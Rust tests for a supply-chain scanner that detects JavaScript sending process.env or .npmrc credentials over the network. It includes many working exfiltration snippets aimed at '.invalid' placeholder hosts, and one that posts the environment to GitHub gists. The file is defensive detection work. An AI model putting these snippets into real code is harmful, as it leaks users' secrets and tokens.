//! FP-GITHUB-SCRIPT: the text follower (`local_data_sent_at`, which answers for a JavaScript text the supply-chain
//! tree does not read: one over 2,000,000 characters, as a GitHub Action's bundle often is, or one it refuses) keeps
//! a variable a function declares to that function where it is sure of that function's body, reads a body's end as
//! JavaScript reads it, and follows a scoped variable into the calls its function makes; a reading that met one of
//! its limits gives what core's reading gives as well (the review of Oct 18). The texts are inert: nothing here is
//! run; the hosts are `.invalid`.

use super::*;

pub(super) fn cps(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

/// What the text follower says is sent: (kind, what, only in an address).
pub(super) fn sent(text: &str) -> Option<(&'static str, String, bool)> {
    local_data_sent_at(&crate::pack::current(), &cps(text)).map(|(_, kind, what, address)| (kind, pystr::to_string(&what), address))
}

pub(super) fn whole() -> Option<(&'static str, String, bool)> {
    Some(("environment", "the whole environment".to_string(), false))
}

/// Functions after which a text is longer than `_LD_LONG` (a bundle's reading: a name carries its data `_LD_NEAR`
/// characters from where it was given it).
fn filler() -> String {
    (0..8000).map(|k| format!("function f{k}(a) {{ return a + {k}; }}\n")).collect()
}

/// Functions with parameters, each called: the text's first `_LD_MAX` functions and calls, so that what follows is
/// past them.
fn called_filler() -> String {
    (0..250).map(|k| format!("function h{k}(a) {{ return a + {k}; }}\nh{k}({k});\n")).collect()
}

/// A comment that takes a text past the supply-chain tree's 2,000,000 characters: the import-time test's text
/// follower answers.
pub(super) fn over_the_tree() -> String {
    format!("/*{}*/\n", " pad".repeat(520_000))
}

/// Statements after which a text is longer than `_LD_LONG` that meet none of the follower's limits (no function, call,
/// assignment or return): a long text read with nothing cut short.
pub(super) fn plain_long() -> String {
    format!("\n{}", "void 0;\n".repeat(40_000))
}

/// The narrowing reading of a text: what it finds, whether a limit stopped a list it read, whether it narrowed a name.
pub(super) fn reading(text: &str) -> (Option<(&'static str, String, bool)>, bool, bool) {
    let rd = Reading::new(true);
    let got = ld_read(&crate::pack::current(), &cps(text), &rd).map(|(_, kind, what, address)| (kind, pystr::to_string(&what), address));
    (got, rd.capped.get(), rd.narrowed.get())
}

/// actions/github-script's bundle (3a2844b, `dist/index.js`, 2.2 MB: the text follower's) cut to the names that
/// carried "the whole environment" to `req.write(data, 'utf8')` (line 41 here, 2176 there): @actions/exec's
/// `_cloneExecOptions` gives a `result` a child process's environment; TypeScript's `__importStar` has a `result` of
/// its own, read as that one, so every module imported through it held the environment (`cp`, `https`), a child's
/// stdout callback's `data` with it, and @actions/http-client's `data` (a parameter of `requestRawWithCallback`) was
/// read as that one. The JavaScript tree, which reads each name's binding, finds nothing in it.
const GITHUB_SCRIPT: &str = r#"var __importStar = (this && this.__importStar) || (function () {
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k in mod) if (k !== "default") result[k] = mod[k];
        return result;
    };
})();
const cp = __importStar(require("child_process"));
const https = __importStar(require("https"));
class ToolRunner {
    exec() {
        const child = cp.spawn(this.toolPath, this.args, this._getSpawnOptions(this.options));
        child.stdout.on("data", (data) => {
            this.emit("stdline", data);
        });
    }
    _cloneExecOptions(options) {
        options = options || {};
        const result = {
            cwd: options.cwd || process.cwd(),
            env: options.env || process.env,
            silent: options.silent || false
        };
        return result;
    }
}
class HttpClient {
    putJson(requestUrl, obj, additionalHeaders = {}) {
        return __awaiter(this, void 0, void 0, function* () {
            const data = JSON.stringify(obj, null, 2);
            const res = yield this.put(requestUrl, data, additionalHeaders);
            return this._processResponse(res, this.requestOptions);
        });
    }
    requestRawWithCallback(info, data, onResult) {
        const req = info.httpModule.request(info.options, (msg) => {
            onResult(undefined, msg);
        });
        if (data && typeof data === "string") {
            req.write(data, "utf8");
        }
        req.end();
    }
    _processResponse(res, options) {
        return __awaiter(this, void 0, void 0, function* () {
            let obj;
            let contents;
            contents = yield res.readBody();
            if (contents && contents.length > 0) {
                obj = JSON.parse(contents);
            }
            return obj;
        });
    }
}
"#;

/// The same with exec's own use of the options (`optionsNonNull` holds the environment, really, and the child is
/// made with it): the stdout callback's `data` is that callback's, not http-client's.
fn github_script_exec() -> String {
    GITHUB_SCRIPT.replace(
        "        const child = cp.spawn(this.toolPath, this.args, this._getSpawnOptions(this.options));",
        "        const optionsNonNull = this._cloneExecOptions(this.options);\n        const child = cp.spawn(this.toolPath, this._getSpawnArgs(optionsNonNull), this._getSpawnOptions(this.options));",
    )
}

pub(super) const HARVEST: &str = "reads credentials or the whole environment and sends data over the network";

pub(super) fn import_reasons(text: &str) -> Vec<String> {
    crate::signs::import_time_risk(&crate::pack::current(), &cps(text), Some("js")).0.iter().map(|r| pystr::to_string(r)).collect()
}

/// The whole environment (or a credential store) really sent, in each shape a script sends it: each is found in a
/// short text, in a bundle's (long) one and past the tree's limit.
const SENDS: &[(&str, &str)] = &[
    ("a body", "async function main() {\n  await fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(process.env) });\n}\nmain();\n"),
    ("a query of its entries", "const https = require('https');\nconst q = Object.entries(process.env).map(([k, v]) => k + '=' + encodeURIComponent(v)).join('&');\nhttps.get('https://c.invalid/x?' + q);\n"),
    ("copied into an object, then written", "const https = require('https');\nfunction collect() {\n  const out = {};\n  for (const k of Object.keys(process.env)) out[k] = process.env[k];\n  return out;\n}\nconst body = JSON.stringify(collect());\nconst req = https.request({ hostname: 'c.invalid', method: 'POST' });\nreq.write(body);\nreq.end();\n"),
    ("spread into a posted object", "const axios = require('axios');\nasync function run() {\n  const payload = { ...process.env, at: Date.now() };\n  await axios.post('https://c.invalid/x', payload);\n}\nrun();\n"),
    ("to GitHub's API, a gist", "async function run() {\n  const body = JSON.stringify({ files: { 'e.json': { content: JSON.stringify(process.env) } } });\n  await fetch('https://api.github.com/gists', { method: 'POST', headers: { authorization: 'token ' + process.env.GITHUB_TOKEN }, body });\n}\nrun();\n"),
    ("through an axios helper", "const axios = require('axios');\nfunction send(url, data) {\n  return axios.post(url, data);\n}\nfunction main() {\n  const env = process.env;\n  send('https://c.invalid/x', { env });\n}\nmain();\n"),
    ("through two helpers", "function gather() {\n  const e = Object.assign({}, process.env);\n  return e;\n}\nfunction ship(d) {\n  const h = require('https');\n  const r = h.request('https://c.invalid/x', { method: 'POST' });\n  r.end(JSON.stringify(d));\n}\nship(gather());\n"),
    ("a module's constant, sent in a function", "const snapshot = JSON.stringify(process.env);\nfunction later() {\n  return fetch('https://c.invalid/x', { method: 'POST', body: snapshot });\n}\nsetTimeout(later, 10);\n"),
    ("a closure", "const https = require('https');\nfunction start() {\n  const blob = JSON.stringify(process.env);\n  setTimeout(() => {\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.end(blob);\n  }, 0);\n}\nstart();\n"),
    ("a `var` given it later", "function f() {\n  var d;\n  d = JSON.stringify(process.env);\n  fetch('https://c.invalid/x', { method: 'POST', body: d });\n}\nf();\n"),
    ("a class's methods", "const https = require('https');\nclass Reporter {\n  collect() {\n    const result = { env: process.env, cwd: process.cwd() };\n    return result;\n  }\n  send() {\n    const data = JSON.stringify(this.collect());\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.write(data, 'utf8');\n    req.end();\n  }\n}\nnew Reporter().send();\n"),
    ("a parameter of the same name", "const https = require('https');\nfunction a() {\n  const data = JSON.stringify(process.env);\n  b(data);\n}\nfunction b(data) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(data);\n  req.end();\n}\na();\n"),
    ("a parameter of another name", "const https = require('https');\nfunction a() {\n  const snapshot = JSON.stringify(process.env);\n  b(snapshot);\n}\nfunction b(payload) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(payload);\n  req.end();\n}\na();\n"),
    ("three helpers", "function collect() {\n  const all = Object.assign({}, process.env);\n  pack(all);\n}\nfunction pack(obj) {\n  const text = JSON.stringify(obj);\n  ship(text);\n}\nfunction ship(body) {\n  fetch('https://c.invalid/x', { method: 'POST', body: body });\n}\ncollect();\n"),
    ("a `var` in a block, sent after it", "function go(flag) {\n  if (flag) {\n    var e = JSON.stringify(process.env);\n  }\n  fetch('https://c.invalid/x', { method: 'POST', body: e });\n}\ngo(1);\n"),
    ("a callback's parameter", "const all = [process.env];\nall.forEach((e) => {\n  fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(e) });\n});\n"),
    ("an anonymous function's", "function outer() {\n  [1].forEach(function (x) {\n    const e = JSON.stringify(process.env);\n    fetch('https://c.invalid/x', { method: 'POST', body: e });\n  });\n}\nouter();\n"),
    // a method's call given a scoped variable, its parameter of the same name; a method's return called on an
    // instance, into a name of the same name (core's reading followed the name in both; a parameter or a name of
    // another name it did not follow, nor does the narrowing reading)
    ("a method's parameter of the same name", "const https = require('https');\nclass R {\n  run() {\n    const data = JSON.stringify(process.env);\n    this.send(data);\n  }\n  send(data) {\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.write(data);\n    req.end();\n  }\n}\nnew R().run();\n"),
    ("an instance's method's return of the same name", "class Stealer {\n  grab() {\n    const data = JSON.stringify(process.env);\n    return data;\n  }\n}\nconst s = new Stealer();\nconst data = s.grab();\nfetch('https://c.invalid/x', { method: 'POST', body: data });\n"),
    // a body's end that a brace counter misreads: a regular expression, a template in a template, a regular
    // expression after an `if`'s head, an HTML-like comment, an inner function's regular expression, and both
    // misreadings at once
    ("past a regular expression's brace", "function go(s) {\n  const e = JSON.stringify(process.env);\n  const t = s.replace(/}/g, '');\n  fetch('https://c.invalid/x', { method: 'POST', body: e + t });\n}\ngo('');\n"),
    ("past a template's", "function go(a) {\n  const e = JSON.stringify(process.env);\n  const t = `${a ? `}` : ''}`;\n  fetch('https://c.invalid/x', { method: 'POST', body: e + t });\n}\ngo(1);\n"),
    ("past a regular expression after `if (…)`", "function go(s) {\n  const e = JSON.stringify(process.env);\n  if (s) /}/.test(s);\n  fetch('https://c.invalid/x', { method: 'POST', body: e });\n}\ngo('');\n"),
    ("past an HTML-like comment", "function go(s) {\n  const e = JSON.stringify(process.env);\n  s = s <!-- }\n  ;\n  fetch('https://c.invalid/x', { method: 'POST', body: e });\n}\ngo('');\n"),
    ("past an inner function's regular expression", "function outer() {\n  const e = JSON.stringify(process.env);\n  function helper(s) { return s.replace(/}/g, ''); }\n  fetch('https://c.invalid/x', { method: 'POST', body: helper(e) });\n}\nouter();\n"),
    ("past both misreadings", "function go(s) {\n  const e = JSON.stringify(process.env);\n  const r = s.replace(/}/g, '');\n  const o = {} / 2; if (s) { s = 1 / 3 }\n  fetch('https://c.invalid/x', { method: 'POST', body: e + r + o });\n}\ngo('');\n"),
];

#[test]
fn the_whole_environment_sent_is_followed_in_every_shape() {
    let long = filler();
    let plain = plain_long();
    for (what, text) in SENDS {
        assert_eq!(sent(text), whole(), "{what}: a short text");
        assert_eq!(sent(&format!("{text}{long}")), whole(), "{what}: a bundle's text");
        assert_eq!(sent(&format!("{text}{plain}")), whole(), "{what}: a long text");
        assert_eq!(reading(text).0, whole(), "{what}: the narrowing reading alone");
    }
    let past = over_the_tree();
    for (what, text) in SENDS.iter().step_by(3) {
        assert_eq!(import_reasons(&format!("{text}{past}")), vec![HARVEST.to_string()], "{what}: past the tree's limit");
    }
    // a credential store's file
    let npmrc = "const fs = require('fs');\nconst os = require('os');\nfunction go() {\n  const t = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n  fetch('https://c.invalid/x', { method: 'POST', body: t });\n}\ngo();\n";
    for text in [npmrc.to_string(), format!("{npmrc}{long}")] {
        let got = sent(&text).expect("the store's file is sent");
        assert_eq!((got.0, got.2), ("file", false));
        assert!(got.1.contains(".npmrc"), "{}", got.1);
    }
    assert_eq!(import_reasons(&format!("{npmrc}{past}")), vec![HARVEST.to_string()]);
}

#[test]
fn a_scopes_calls_are_read_past_the_texts_first() {
    // past the text's first `_LD_MAX` functions and calls, the parameters a declared variable is given by a call in
    // its function are followed: with a parameter of the same name and of another, and three helpers on
    let head = called_filler();
    let long = filler();
    for what in ["a parameter of the same name", "a parameter of another name", "three helpers"] {
        let text = SENDS.iter().find(|(w, _)| *w == what).unwrap().1;
        assert_eq!(sent(&format!("{head}{text}{long}")), whole(), "{what}");
    }
    // and a callback's parameter given to one
    let callback = "const all = [process.env];\nall.forEach((e) => {\n  post(e);\n});\nfunction post(x) {\n  fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(x) });\n}\n";
    assert_eq!(sent(callback), whole());
    assert_eq!(sent(&format!("{head}{callback}{long}")), whole());
}

#[test]
fn a_callbacks_parameters_are_its_own() {
    let p = crate::pack::current();
    let scope = |text: &str, param: &str| {
        let t = cps(text);
        callback_scope(&p, &t, text.find(param).unwrap()).map(|(a, b)| (text[..a].chars().count(), text[..].chars().nth(b)))
    };
    let to_end = |text: &str, from: &str| Some((text.find(from).unwrap(), Some('}')));
    let a = "x.on('data', (data) => { use(data); });";
    assert_eq!(scope(a, "data)"), to_end(a, "(data)"));
    let b = "x.on('data', data => {\n  use(data);\n});";
    assert_eq!(scope(b, "data =>"), to_end(b, "data =>"));
    let c = "x.on('data', function (data) { use(/x/.test(data)); });";
    assert_eq!(scope(c, "data)"), to_end(c, "(data)"));
    // a body whose end the two readers do not agree on (a regular expression's brace): not sure, not known
    assert_eq!(scope("x.on('data', function (data) { use(/}/.test(data)); });", "data)"), None);
    let d = "x.forEach(({ k, v }) => { use(k, v); });";
    assert_eq!(scope(d, "{ k"), to_end(d, "({ k"));
    // an arrow's expression, a name given where a callback goes, a body not closed: not known
    assert_eq!(scope("x.on('data', (data) => use(data));", "data)"), None);
    assert_eq!(scope("x.on('data', handler);", "handler"), None);
    assert_eq!(scope("x.on('data', (data) => { use(data);", "data)"), None);
    // where a callback's first parameter stands
    let first = |text: &str| first_param_at(&cps(text), 0).map(|k| text.chars().nth(k));
    assert_eq!(first(" (r) => r.text()"), Some(Some('r')));
    assert_eq!(first("async function named(r) {}"), Some(Some('r')));
    assert_eq!(first("({ a }) => a"), Some(Some('{')));
    assert_eq!(first("'x', y"), None);
}

#[test]
fn another_functions_variable_of_the_name_is_another_variable() {
    // a parameter of the same name the variable is not given: not it
    let not_given = "const https = require('https');\nfunction a() {\n  const data = JSON.stringify(process.env);\n  console.log(data.length);\n  b('hello');\n}\nfunction b(data) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(data);\n  req.end();\n}\na();\n";
    // a helper's own `var` of the name, and a nested function's parameter
    let helper = "function options(o) {\n  const result = { cwd: o.cwd || process.cwd(), env: o.env || process.env };\n  return result.cwd;\n}\nvar wrap = function (mod) {\n  var result = {};\n  for (var k in mod) result[k] = mod[k];\n  return result;\n};\nfunction step(result) { return result.done; }\nconst https = wrap(require('https'));\nfunction post(info, data) {\n  const req = https.request(info, () => {});\n  req.write(data);\n  req.end();\n}\npost({}, step({ done: 1 }));\n";
    let long = filler();
    let plain = plain_long();
    let exec = github_script_exec();
    assert_ne!(exec, GITHUB_SCRIPT);
    for (what, text) in [("not given", not_given), ("a helper's own", helper), ("github-script's", GITHUB_SCRIPT), ("github-script's with exec's", &exec)] {
        assert_eq!(sent(text), None, "{what}: a short text");
        assert_eq!(sent(&format!("{text}{plain}")), None, "{what}: a long text");
        assert_eq!(import_reasons(&format!("{text}{}", over_the_tree())), Vec::<String>::new(), "{what}: past the tree's limit");
        // a text that meets one of the follower's limits (the filler's functions are more than the parameters it
        // keeps): core's reading is given too, which conflates the names (but for the helper's, which it reads quiet)
        let (got, capped, narrowed) = reading(&format!("{text}{long}"));
        assert!(capped && narrowed && got.is_none(), "{what}: a bundle's text");
        let core = if what == "a helper's own" { None } else { whole() };
        assert_eq!(sent(&format!("{text}{long}")), core, "{what}: a bundle's text");
    }
}

#[test]
fn a_javascript_bodys_end() {
    let p = crate::pack::current();
    let end = |body: &str| -> (Option<usize>, Option<(usize, bool)>) {
        let t = cps(body);
        (ld_block_end(&p, &t, 0), js_block_end(&p, &t, 0))
    };
    let sure = |body: &str| sure_block_end(&p, &cps(body), 0);
    let last = |body: &str| body.chars().count() - 1;
    for body in [
        "{ a = b / c; if (d) { e = 1 / 2 } }",
        "{ s = '}'; t = \"}\"; u = `}`; }",
        "{ // }\n x = 1; /* } */ }",
        "{ return {} / 2; }",
        "{ x = `a${ {k: '}'}.k }b`; y = 1; }",
        "{ n++ / 2; m-- / 3; }",
        "{ if (s) { t = 1 } /x/.test(s); }",
        "{ do { s++ } while (s < 2) }",
    ] {
        assert_eq!(end(body), (Some(last(body)), Some((last(body), true))), "{body}");
        assert_eq!(sure(body), Some(last(body)), "{body}");
    }
    // a brace counter's misreadings (an end too early, or none), which js_block_end reads as JavaScript does: the
    // readers disagree, so the end is not sure
    for body in [
        "{ x = y ? /{/ : z; }",
        "{ a = s.replace(/}/g, ''); b = 1; }",
        "{ t = `${a ? `}` : ''}`; b = 1; }",
        "{ if (s) /}/.test(s); b = 1; }",
        "{ return /}/; }",
        "{ outer: for (;;) { break outer; }\n /}/.test(s); }",
    ] {
        let (ld, js) = end(body);
        assert_eq!(js, Some((last(body), true)), "{body}");
        assert!(ld.is_some_and(|e| e < last(body)) || ld.is_none(), "{body}: {ld:?}");
        assert_eq!(sure(body), None, "{body}");
    }
    // what a `/` after it is, the tokens do not say (the review of Oct 18: a class's body, a label's block, a word ASI
    // ends a statement after, an HTML-like comment): js_block_end's end is a guess, and not sure
    for body in [
        "{ class M {}\n /}/.test(s); b = 1; }",
        "{ class M extends Object {}\n /}/.test(s); b = 1; }",
        "{ class M extends (function(){return Object;})() {}\n /}/.test(s); b = 1; }",
        "{ class M { static { M.x = 1; } }\n /}/.test(s); b = 1; }",
        "{ x = class M {}\n /x/.test(s); b = 1; }",
        "{ outer: { if (s) break outer; }\n /}/.test(s); b = 1; }",
        "{ const f = () => {}\n /x/.test(s); b = 1; }",
        "{ x = await /x/; }",
        "{ s = s <!-- }\n b = 1; }",
        "{ x = 1\n--> }\n b = 1; }",
        "{ x = a ? /}\n b = 1; }",
    ] {
        assert!(end(body).1.map_or(true, |(_, certain)| !certain), "{body}: {:?}", end(body).1);
        assert_eq!(sure(body), None, "{body}");
    }
    // a word ASI ends a statement after: a regular expression follows, as JavaScript reads it
    for body in [
        "{ for (;;) { break\n /}/.test(s); }\n b = 1; }",
        "{ for (;;) { continue\n /}/.test(s); }\n b = 1; }",
        "{ lbl: for (;;) { break lbl\n /}/.test(s); }\n b = 1; }",
        "{ if (s) { debugger\n /}/.test(s); }\n b = 1; }",
        "{ function inner() { return\n /}/.test(s); }\n b = 1; }",
    ] {
        assert_eq!(end(body).1.map(|(e, _)| e), Some(last(body)), "{body}");
        assert_eq!(sure(body), None, "{body}: the brace counter reads the regular expression's brace");
    }
    // not closed, or a string that runs past its line: not known
    for body in ["{ a = 1;", "{ s = 'one\n two'; }", "{ /* } "] {
        assert_eq!(end(body).1, None, "{body}");
        assert_eq!(sure(body), None, "{body}");
    }
}

#[test]
fn ecmascripts_line_terminators_and_white_space() {
    // the review of Oct 20 (HIGH 1): U+2028 and U+2029 are line terminators, and NBSP, U+FEFF and every Zs white space,
    // to both readers: a line comment ends at each terminator, a regular expression may not hold one, ASI breaks a line
    // at each; and a decision on a character the reading does not model is a guess
    let p = crate::pack::current();
    let end = |body: &str| -> (Option<usize>, Option<(usize, bool)>) {
        let t = cps(body);
        (ld_block_end(&p, &t, 0), js_block_end(&p, &t, 0))
    };
    let sure = |body: &str| sure_block_end(&p, &cps(body), 0);
    let last = |body: &str| body.chars().count() - 1;
    // a line comment ends at each terminator: the code after it is read, by both readers
    for lt in ["\n", "\r", "\u{2028}", "\u{2029}"] {
        let body = format!("{{ // a note{lt} if (s) {{ s = s + 1; }}\n b = 1; }}");
        assert_eq!(end(&body), (Some(last(&body)), Some((last(&body), true))), "{body:?}");
        assert_eq!(sure(&body), Some(last(&body)), "{body:?}");
    }
    // a word ASI ends a statement after, then a terminator: a regular expression (the brace counter reads its brace)
    for lt in ["\n", "\r", "\u{2028}", "\u{2029}"] {
        for body in [
            format!("{{ debugger{lt}/}}/.test(s); b = 1; }}"),
            format!("{{ for (;;) {{ break{lt} /}}/.test(s); }}\n b = 1; }}"),
            format!("{{ for (;;) {{ continue{lt}/}}/.test(s); }}\n b = 1; }}"),
            format!("{{ lbl: for (;;) {{ break lbl{lt}/}}/.test(s); }}\n b = 1; }}"),
            format!("{{ return{lt}/}}/; }}"),
        ] {
            assert_eq!(end(&body).1, Some((last(&body), true)), "{body:?}");
            assert_eq!(sure(&body), None, "{body:?}");
        }
    }
    // white space between `break` and its label (the label's line then ends): a regular expression follows
    for ws in [" ", "\t", "\u{0B}", "\u{0C}", "\u{A0}", "\u{FEFF}", "\u{1680}", "\u{2000}", "\u{200A}", "\u{202F}", "\u{205F}", "\u{3000}"] {
        let body = format!("{{ lbl: for (;;) {{ break{ws}lbl\n /}}/.test(s); }}\n b = 1; }}");
        assert_eq!(end(&body).1, Some((last(&body), true)), "{body:?}");
        assert_eq!(sure(&body), None, "{body:?}");
        let body = format!("{{{ws}if (s) {{ t = 1 }}{ws}/x/.test(s);{ws}}}");
        assert_eq!(sure(&body), Some(last(&body)), "{body:?}");
    }
    // a spread's regular expression, a loop's `for await` head, a private name: as JavaScript reads them
    for body in ["{ x = [.../}/.exec(s)]; b = 1; }", "{ for await (const x of y) /}/.test(s); b = 1; }"] {
        assert_eq!(end(body).1, Some((last(body), true)), "{body}");
        assert_eq!(sure(body), None, "{body}");
    }
    assert_eq!(sure("{ n = this.#return / 2 / 3; }"), Some(last("{ n = this.#return / 2 / 3; }")));
    // what the reading does not model, where it decides: a guess, and not sure
    for body in [
        "{ x = fuß / 2; /}/.test(s); b = 1; }",
        "{ x = ñreturn / 2 / 3; b = 1; }",
        "{ x = \\u{61}return / 2 / 3; b = 1; }",
        "{ lbl: for (;;) { break /* c */ lbl\n /}/.test(s); }\n b = 1; }",
    ] {
        assert!(end(body).1.map_or(true, |(_, certain)| !certain), "{body}: {:?}", end(body).1);
        assert_eq!(sure(body), None, "{body}");
    }
    // a string holding U+2028 is one string (ES2019); one holding a CR runs past its line
    let body = "{ s = 'a\u{2028}}'; b = 1; }";
    assert_eq!(end(body).1, Some((last(body), true)));
    assert_eq!(end("{ s = 'a\r}'; b = 1; }").1, None);
}

#[test]
fn a_declarations_keyword() {
    let at = |text: &str, name: &str| declared_at(&cps(text), text.find(name).unwrap());
    assert_eq!(at("const x = 1", "x"), Some(0));
    assert_eq!(at("  let\tx = 1", "x"), Some(2));
    assert_eq!(at("var\n  x = 1", "x"), Some(0));
    assert_eq!(at("for (const [k, v] of e)", "["), Some(5));
    assert_eq!(at("x = 1", "x"), None);
    assert_eq!(at("myvar x = 1", "x"), None);
    assert_eq!(at("a.var x", "x"), None);
    assert_eq!(at("constx = 1", "x = 1"), None);
}
